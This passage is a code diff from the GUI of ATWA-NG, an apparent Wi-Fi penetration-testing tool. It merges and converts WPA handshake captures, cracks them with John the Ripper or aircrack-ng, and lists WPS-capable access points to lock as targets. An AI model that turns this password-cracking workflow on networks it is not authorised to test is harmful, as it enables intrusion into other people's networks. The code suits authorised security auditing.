+            self._queue.put(("info", "Converted:\n" + "\n".join(results)))
+            self._queue.put(("status", "Ready."))
+            self._queue.put(("ui", self._refresh_captures))
+            return "converted"
+
+        self._run_capture_task("Convert to 22000", work)
+
+    def _capture_fix(self):
+        paths = self._selected_capture_paths()
+        if not paths:
+            messagebox.showwarning("ATWA-NG", "Select a capture to fix first.")
+            return
+        from ..crack.convert import fix_capture
+
+        def work():
+            outputs = [fix_capture(p) for p in paths]
+            self._queue.put(("info", "Fixed:\n" + "\n".join(outputs)))
+            self._queue.put(("ui", self._refresh_captures))
+            return "fixed"
+
+        self._run_capture_task("Fix capture(s)", work)
+
+    def _capture_merge(self):
+        paths = self._selected_capture_paths()
+        if len(paths) < 2:
+            messagebox.showwarning("ATWA-NG", "Select at least two captures to merge.")
+            return
+        from ..crack.convert import merge_captures
+        from ..storage import bssids_from_paths
+
+        if any(not p.lower().endswith((".cap", ".pcap", ".pcapng")) for p in paths):
+            messagebox.showwarning("ATWA-NG", "Merge accepts raw .cap/.pcap/.pcapng captures only, not .22000 files.")
+            return
+        bssids = bssids_from_paths(paths)
+        if len(bssids) != 1:
+            messagebox.showwarning(
+                "ATWA-NG",
+                "Merge captures from one BSSID at a time. A file containing multiple APs cannot be cracked safely.",
+            )
+            return
+        bssid = next(iter(bssids))
+
+        def work():
+            from pathlib import Path
+
+            suffix = Path(paths[0]).suffix
+            out = merge_captures(
+                paths,
+                output_dir=Path(paths[0]).parent,
+                output_name=f"capture_{bssid.replace(':', '-')}.merged{suffix}",
+            )
+            self._queue.put(("info", f"Merged into:\n{out}"))
+            self._queue.put(("ui", self._refresh_captures))
+            return out
+
+        self._run_capture_task("Merge captures", work)
+
+    def _capture_benchmark_john(self):
+        """Real per-machine John speed (candidates/sec) via John's own
+        --test self-benchmark -- no hashfile/wordlist needed, just the
+        format. No --fork: John rejects --test combined with --fork."""
+        from ..crack.john import JohnCracker, JohnUnavailableError
+
+        def work():
+            try:
+                cracker = JohnCracker()
+            except JohnUnavailableError as exc:
+                return str(exc)
+            result = cracker.benchmark()
+            self._queue.put(("info", result))
+            return "done"
+
+        self._run_capture_task("Benchmark John", work)
+
+    def _open_wps_scan(self):
+        """Live table of currently-known WPS-capable APs (manufacturer/model/
+        device name -- already collected passively by every normal scan pass
+        via secure.py's wps_profile(), just never surfaced anywhere in the
+        GUI before). Unlike v1's WPS Scan popup (read-only, nothing in it is
+        clickable -- 2026-08-27 user report), double-click a row to lock that
+        target in the main window, matching what you'd actually want to do
+        with a WPS recon result."""
+        win = tk.Toplevel(self.root)
+        win.title("WPS Scan")
+        win.configure(bg=self.THEME["bg"])
+        win.geometry("840x420")
+        win.transient(self.root)
+
+        ttk.Button(win, text="Refresh", command=lambda: self._refresh_wps_scan(tree)).pack(
+            anchor=tk.NE, padx=6, pady=(6, 0))
+
+        cols = ("bssid", "channel", "signal", "wps", "manufacturer", "model", "ssid")
+        tree = ttk.Treeview(win, columns=cols, show="headings", selectmode="browse")
+        headings = {
+            "bssid": "BSSID", "channel": "CH", "signal": "Signal", "wps": "WPS",
+            "manufacturer": "Manufacturer", "model": "Model", "ssid": "ESSID",
+        }
+        widths = {"bssid": 150, "channel": 45, "signal": 75, "wps": 75, "manufacturer": 140, "model": 150, "ssid": 170}
+        for key in cols:
+            tree.heading(key, text=headings[key])
+            tree.column(key, width=widths[key], minwidth=40)
+        vsb = ttk.Scrollbar(win, orient=tk.VERTICAL, command=tree.yview)
+        tree.configure(yscrollcommand=vsb.set)
+        tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(6, 0), pady=6)
+        vsb.pack(side=tk.LEFT, fill=tk.Y, pady=6)
+
+        def lock_selected(_event=None):
+            sel = tree.selection()
+            if not sel:
+                return
+            bssid = sel[0]
+            if bssid not in self.aps:
+                return
+            win.destroy()
+            self.tree.selection_set(bssid)
+            self._on_target_select()
+
+        tree.bind("<Double-1>", lock_selected)
+
+        menu = tk.Menu(win, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
+        menu.add_command(label="Lock This Target", command=lock_selected)
+        menu.add_command(label="Copy BSSID", command=lambda: self._copy_to_clipboard(tree.selection()[0]) if tree.selection() else None)
+
+        def on_right_click(event):
+            row = tree.identify_row(event.y)
+            if not row:
+                return
+            tree.selection_set(row)
+            menu.tk_popup(event.x_root, event.y_root)
+
+        tree.bind("<Button-3>", on_right_click)
+
+        self._refresh_wps_scan(tree)
+
+    def _refresh_wps_scan(self, tree: ttk.Treeview):
+        tree.delete(*tree.get_children())
+        rows = [ap for ap in list(self.aps.values()) if ap.wps]  # list() snapshot: scan thread mutates self.aps concurrently
+        rows.sort(key=lambda ap: ap.signal if ap.signal is not None else -999, reverse=True)
+        for ap in rows:
+            tree.insert("", tk.END, iid=ap.bssid, values=(
+                ap.bssid, ap.channel or "-", ap.signal if ap.signal is not None else "-", ap.wps,
+                ap.wps_manufacturer or "-", ap.wps_model_name or "-", ap.ssid or "<hidden>",
+            ))
+
+    def _capture_crack(self):
+        """Crack the selected file(s): .22000 -> John, .cap/.pcap/.pcapng ->
+        aircrack-ng (simpler for a single known target, per user request —
+        needs one BSSID, derived from the capture path)."""
+        selected = self._selected_capture_paths()
+        hash_paths = [p for p in selected if p.lower().endswith(".22000")]
+        cap_paths = [p for p in selected if p.lower().endswith((".cap", ".pcap", ".pcapng"))]
+        if not hash_paths and not cap_paths:
+            messagebox.showwarning("ATWA-NG", "Select one or more .22000 hash files or capture files first.")
+            return
+        if hash_paths and cap_paths:
+            messagebox.showwarning("ATWA-NG", "Select either hash files or raw captures, not both. Use the backend button for a mixed selection.")
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+
+        if hash_paths:
+            self._crack_with_john(hash_paths, wordlist)
+        else:
+            self._crack_with_aircrack(cap_paths, wordlist)
+
+    def _crack_with_john(self, paths: list[str], wordlist: str, cap_paths: list[str] | None = None):
+        """cap_paths (optional): raw .cap/.pcap/.pcapng files to convert to
+        22000 first, for the quick 'Crack w/ John' button which accepts
+        either hash or capture files straight from the Captures selection."""
+        from ..crack.convert import merge_22000_files
+        from ..crack.john import JohnCracker, JohnUnavailableError
+        from ..storage import bssids_from_paths, unique_path
+
+        def work():
+            from pathlib import Path
+
+            from ..crack.convert import cap_to_22000
+
+            all_paths = list(paths)
+            for cap in cap_paths or []:
+                out = unique_path(Path(f"{cap}.22000"))
+                cap_to_22000(cap, str(out))
+                all_paths.append(str(out))
+            hashfile = all_paths[0]
+            if len(all_paths) > 1:
+                merged_lines = merge_22000_files(all_paths)
+                bssids = bssids_from_paths(all_paths)
+                bssid_label = next(iter(bssids)).replace(":", "-") if len(bssids) == 1 else "unknown-bssid"
+                output_dir = Path(self.capture_dir_var.get())
+                output_dir.mkdir(parents=True, exist_ok=True)
+                hashfile = str(unique_path(output_dir / f"merged_{bssid_label}.22000"))
+                Path(hashfile).write_text("\n".join(merged_lines) + "\n")
+            try:
+                cracker = JohnCracker()
+            except JohnUnavailableError as exc:
+                return str(exc)
+            self._crack_proc_holder.clear()
+            results = cracker.run_streaming(hashfile, wordlist, self._progress_fn, self._crack_proc_holder,
+                                             rules=self.john_rules_var.get())
+            if not results:
+                return "no passwords recovered"
+            self._queue.put(("info", "\n".join(f"{k}: {v}" for k, v in results.items())))
+            return f"{len(results)} recovered"
+
+        self._run_capture_task("Crack with John", work)
+
+    def _crack_with_aircrack(self, paths: list[str], wordlist: str):
+        import re
+        from pathlib import Path
+        from tkinter import simpledialog
+
+        from ..crack.aircrack import AirCracker, AircrackUnavailableError
+        from ..crack.convert import merge_captures
+        from ..storage import bssids_from_paths
+
+        bssids = bssids_from_paths(paths)
+        if len(bssids) > 1:
+            messagebox.showwarning(
+                "ATWA-NG",
+                "Select captures from one BSSID at a time. aircrack-ng needs one unambiguous target.",
+            )
+            return
+        if bssids:
+            bssid = next(iter(bssids))
+        else:
+            typed = simpledialog.askstring(
+                "ATWA-NG",
+                "Couldn't determine the BSSID from this file's path — aircrack-ng needs one "
+                "to avoid its interactive network picker. Enter it directly:",
+                parent=self.root,
+            )
+            if not typed or not re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", typed.strip()):
+                if typed is not None:
+                    messagebox.showwarning("ATWA-NG", "Not a valid BSSID (expected aa:bb:cc:dd:ee:ff).")
+                return
+            bssid = typed.strip().lower()
+
+        def work():
+            if len(paths) == 1:
+                capfile = paths[0]
+            else:
+                suffix = Path(paths[0]).suffix
+                capfile = merge_captures(
+                    paths,
+                    output_dir=Path(paths[0]).parent,
+                    output_name=f"capture_{bssid.replace(':', '-')}.merged{suffix}",
+                )
+            try:
+                cracker = AirCracker(bssid)
+            except AircrackUnavailableError as exc:
+                return str(exc)
+            self._crack_proc_holder.clear()
+            results = cracker.run_streaming(capfile, wordlist, self._progress_fn, self._crack_proc_holder)
+            if not results:
+                return "no password recovered"
+            self._queue.put(("info", "\n".join(f"{k}: {v}" for k, v in results.items())))
+            return f"cracked: {results.get(bssid)}"
+
+        self._run_capture_task(f"Crack with aircrack-ng ({bssid})", work)
+
+    def _capture_crack_john(self):
+        """Quick button: force John on the current selection regardless of
+        file type (caps get auto-converted), skipping _capture_crack's
+        auto-detect."""
+        selected = self._selected_capture_paths()
+        hash_paths = [p for p in selected if p.lower().endswith(".22000")]
+        cap_paths = [p for p in selected if p.lower().endswith((".cap", ".pcap", ".pcapng"))]
+        if not hash_paths and not cap_paths:
+            messagebox.showwarning("ATWA-NG", "Select one or more .22000 hash files or capture files first.")
+            return
+        from ..storage import bssids_from_paths
+
+        bssids = bssids_from_paths(hash_paths + cap_paths)
+        if len(bssids) > 1:
+            messagebox.showwarning("ATWA-NG", "Select captures from one BSSID at a time.")
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+        self._crack_with_john(hash_paths, wordlist, cap_paths=cap_paths)
+
+    def _capture_crack_aircrack(self):
+        """Quick button: force aircrack-ng on the current selection."""
+        selected = self._selected_capture_paths()
+        cap_paths = [p for p in selected if p.lower().endswith((".cap", ".pcap", ".pcapng"))]
+        if not cap_paths:
+            messagebox.showwarning(
+                "ATWA-NG", "Aircrack-ng needs .cap/.pcap/.pcapng file(s) — select capture file(s), not .22000 hashes.")
+            return
+        wordlist = self.wordlist_var.get()
+        if not wordlist:
+            messagebox.showwarning("ATWA-NG", "Set a wordlist first (File > Set Wordlist).")
+            return
+        self._crack_with_aircrack(cap_paths, wordlist)
+
+    def _capture_cleanup(self):
+        """Preview then run housekeeping.cleanup_handshakes — merges each
+        target's captures/hashes down to one file, then all targets into
+        one master, deleting originals only after each merge is written.
+        Destructive, so this always previews (dry_run) before asking."""
+        from ..housekeeping import cleanup_handshakes
+
+        plan = cleanup_handshakes(dry_run=True, root=self.capture_dir_var.get())
+        if not plan.targets:
+            messagebox.showinfo("ATWA-NG", "No target folders with captures to clean up.")
+            return
+        total_caps = sum(len(t.cap_files) for t in plan.targets)
+        total_hashes = sum(len(t.hash_files) for t in plan.targets)
+        preview = (
+            f"{len(plan.targets)} target folder(s), {total_caps} capture file(s) + "
+            f"{total_hashes} hash file(s) total.\n\n"
+            "This will consolidate files within each target only:\n"
+            "  1. Merge each target's own captures into a BSSID-named file\n"
+            "  2. Merge each target's own .22000 files into a BSSID-named file\n"
+            "  3. Delete originals only after the replacement is written\n"
+            "  4. Leave one-file targets untouched\n\n"
+            "Different BSSIDs are never merged together: a multi-AP capture is not "
+            "safe for aircrack-ng. This cannot be undone. Continue?"
+        )
+        if not messagebox.askokcancel("Cleanup Handshakes", preview):
+            return
+
+        def work():
+            report = cleanup_handshakes(dry_run=False, root=self.capture_dir_var.get())
+            self._queue.put(("info", report.summary()))
+            self._queue.put(("ui", self._refresh_captures))
+            return f"{len(report.deleted)} file(s) deleted, {len(report.removed_dirs)} folder(s) removed"
+
+        self._run_capture_task("Cleanup handshakes", work)
+
+    # ------------------------------------------------------------------
+    # Misc
+    # ------------------------------------------------------------------
+    def _choose_wordlist(self):
+        path = filedialog.askopenfilename(title="Select wordlist")
+        if path:
+            self.wordlist_var.set(path)
+
+    # Curated subset of John's stock rule sections (see /etc/john/john.conf
+    # [List.Rules:*]) -- not exhaustive, just the commonly-used ones. Free
+    # text is still accepted for anything else defined there.
+    _JOHN_RULE_PRESETS = ("None", "Wordlist", "best64", "Jumbo", "All", "hashcat")
+
+    def _choose_john_rules(self):
+        """Global setting (File menu, not per-dialog): which John --rules
+        section every crack run uses, applied uniformly whether cracking
+        starts from the Captures panel's quick buttons or the Crack
+        Handshakes dialog -- one setting, everywhere John runs."""
+        win = tk.Toplevel(self.root)
+        win.title("Set John Ruleset")
+        win.configure(bg=self.THEME["bg"])
+        win.transient(self.root)
+        win.resizable(False, False)
+
+        ttk.Label(win, text="John --rules section (word-mangling rules applied to the wordlist):").pack(
+            anchor=tk.W, padx=10, pady=(10, 4))
+        var = tk.StringVar(value=self.john_rules_var.get() or "None")
+        combo = ttk.Combobox(win, textvariable=var, values=self._JOHN_RULE_PRESETS, width=30)
+        combo.pack(anchor=tk.W, padx=10, pady=(0, 4))
+        ttk.Label(win, text="(or type any other section name from john.conf)",
+                  style="Muted.TLabel").pack(anchor=tk.W, padx=10, pady=(0, 10))
+
+        def apply_and_close():
+            chosen = var.get().strip() or "None"
+            self.john_rules_var.set("" if chosen.lower() == "none" else chosen)
+            win.destroy()
+
+        buttons = ttk.Frame(win)
+        buttons.pack(fill=tk.X, padx=10, pady=(0, 10))
+        ttk.Button(buttons, text="OK", command=apply_and_close, style="Accent.TButton").pack(side=tk.LEFT)
+        ttk.Button(buttons, text="Cancel", command=win.destroy).pack(side=tk.LEFT, padx=6)
+
+    def _choose_capture_dir(self):
+        path = filedialog.askdirectory(title="Select capture folder")
+        if path:
+            self.capture_dir_var.set(path)
+            self._refresh_captures()
+
+    def _check_dependencies(self, *, startup: bool = False):
+        from ..deps import check_all, missing_required
+
+        statuses = check_all()
+        missing = missing_required(statuses)
+        if startup:
+            # Quiet by default — only interrupt if something REQUIRED is
+            # missing (app is largely nonfunctional without it). Optional
+            # tools just get a one-line log summary instead of a modal
+            # on every single launch.
+            opt_missing = [s.name for s in statuses if not s.required and not s.found]
+            if opt_missing:
+                self._log(f"optional tools not found (some Captures actions will report unavailable): {', '.join(opt_missing)}")
+            else:
+                self._log("all optional tools found")
+            if missing:
+                names = ", ".join(s.name for s in missing)
+                messagebox.showwarning(
+                    "ATWA-NG",
+                    f"Required tool(s) missing: {names}\n\nMonitor mode/scanning will fail until these are installed.",
+                )
+            return
+
+        lines = ["Required:"]
+        for s in statuses:
+            if not s.required:
+                continue
+            mark = "✓" if s.found else "✗ MISSING"
+            lines.append(f"  {mark}  {s.name} — {s.feature}" + ("" if s.found else f"  ({s.apt})"))
+        lines.append("\nOptional (gates one Captures action each):")
+        for s in statuses:
+            if s.required:
+                continue
+            mark = "✓" if s.found else "✗ missing"
+            lines.append(f"  {mark}  {s.name} — {s.feature}" + ("" if s.found else f"  ({s.apt})"))
+        messagebox.showinfo("Dependencies", "\n".join(lines))
+
+    def _show_about(self):
+        # Custom dialog, not messagebox.showinfo -- the built-in one can't
+        # center its text or match the app's theme (2026-08-27 user
+        # request: centered, links restored, tagline/long description
+        # still trimmed as "unnecessary").
+        win = tk.Toplevel(self.root)
+        win.title("About ATWA-NG")
+        win.configure(bg=self.THEME["bg"])
+        win.resizable(False, False)
+        win.transient(self.root)
+        try:
+            self._about_logo_image = tk.PhotoImage(file=str(Path(__file__).parent / "assets" / "logo_about.png"))
+            tk.Label(win, image=self._about_logo_image, bg=self.THEME["bg"]).pack(padx=32, pady=(24, 0))
+        except tk.TclError:
+            pass
+        text = (
+            f"ATWA-NG\nVersion {__version__}\n\n"
+            "by KiMiGuel — INDEPENTEST LLC\n"
+            "github.com/KiMiGuel\n"
+            "indepentest.pro"
+        )
+        ttk.Label(win, text=text, justify=tk.CENTER, anchor=tk.CENTER).pack(padx=32, pady=(12, 12))
+        ttk.Button(win, text="OK", command=win.destroy).pack(pady=(0, 16))
+        win.update_idletasks()
+        x = self.root.winfo_rootx() + (self.root.winfo_width() - win.winfo_width()) // 2
+        y = self.root.winfo_rooty() + (self.root.winfo_height() - win.winfo_height()) // 2
+        win.geometry(f"+{x}+{y}")
+
+    def _load_demo_data(self):
+        self.aps = {
+            "22:87:ec:67:42:b1": AccessPoint(
+                bssid="22:87:ec:67:42:b1", ssid="Indepentester", channel=1,
+                security="WPA2", pmf="none", signal=-42, clients={"aa:bb:cc:dd:ee:01"},
+            ),
+            "de:ad:be:ef:00:01": AccessPoint(
+                bssid="de:ad:be:ef:00:01", ssid="ExampleNet-5G", channel=44,
+                security="WPA3", pmf="required", signal=-61, clients=set(),
+            ),
+            "de:ad:be:ef:00:02": AccessPoint(
+                bssid="de:ad:be:ef:00:02", ssid=None, channel=6,
+                security="open", pmf="none", signal=-70, clients={"11:22:33:44:55:66", "11:22:33:44:55:67"},
+            ),
+        }
+        self.mon_iface = "wlan0 (demo)"
+        self.own_mac = "de:ad:be:ef:ff:ff"
+        self.mac_var.set(self.own_mac)
+        self.monitor_status_var.set(f"MONITOR: {self.mon_iface}")
+        self._render_targets()
+        self.tree.selection_set("22:87:ec:67:42:b1")
+        self._on_target_select()
+        import random
+
+        random.seed(42)
+        val = -42
+        for _ in range(30):
+            val += random.randint(-6, 6)
+            self.signal_graph.add_sample(val)
+        self._log("demo data loaded — no hardware touched")
+
+    def _save_settings(self):
+        self.settings.set("wordlist", self.wordlist_var.get())
+        self.settings.set("john_rules", self.john_rules_var.get())
+        self.settings.set("capture_dir", self.capture_dir_var.get())
+        self.settings.set("adapter", self.adapter_var.get())
+        self.settings.set("iface_ap", self.iface_ap_var.get())
+        self.settings.set("security_filter", self.security_filter_var.get())
+        self.settings.set("randomize_mac", self.randomize_mac_var.get())
+        self.settings.set("sort_col", self._sort_col)
+        self.settings.set("sort_reverse", self._sort_reverse)
+        self.settings.set("hidden_columns", sorted(self.hidden_columns))
+        self.settings.set("column_order", self.column_order)
+        try:
+            self.settings.save()
+        except OSError as exc:
+            self._log(f"could not save settings: {exc}")
+
+    def _on_close(self):
+        self._scanning.clear()
+        self._stop_event.set()
+        self._stop_lock_capture()
+        # The scan loop thread (_start_scan) may be mid-blocking-sniff() when
+        # _scanning is cleared -- sniff()'s call is timed (up to one dwell
+        # period) and doesn't notice the flag until it returns. Without
+        # waiting here, set_managed_mode() below (which does `ip link set
+        # <iface> down`) could run while that thread's raw socket is still
+        # open, yanking the interface out from under a live read -- this is
+        # exactly the "[Errno 100] Network is down" scapy warning users see
+        # on close, reproduced live (2026-08-27): AsyncSniffer left running
+        # + set_managed_mode() called concurrently = deterministic ENETDOWN.
+        # No driver quirk involved -- any open raw socket on an interface
+        # that goes admin-down behaves this way, on any adapter. The join
+        # timeout only needs to cover one dwell period plus loop overhead
+        # (dwell defaults to 0.25s); 2s leaves comfortable margin.
+        if self._scan_thread is not None:
+            self._scan_thread.join(timeout=2.0)
+        self._save_settings()
+        if self.mon_iface and "demo" not in self.mon_iface:
+            try:
+                from ..radio import set_managed_mode
+
+                set_managed_mode(self.mon_iface, restore_mac=self._permanent_mac)
+            except Exception:  # noqa: BLE001, S110 - shutdown cleanup must be best-effort
+                pass
+        self.root.destroy()
+
+
+def main(demo: bool = False) -> int:
+    root = tk.Tk()
+    App(root, demo=demo)
+    root.mainloop()
+    return 0
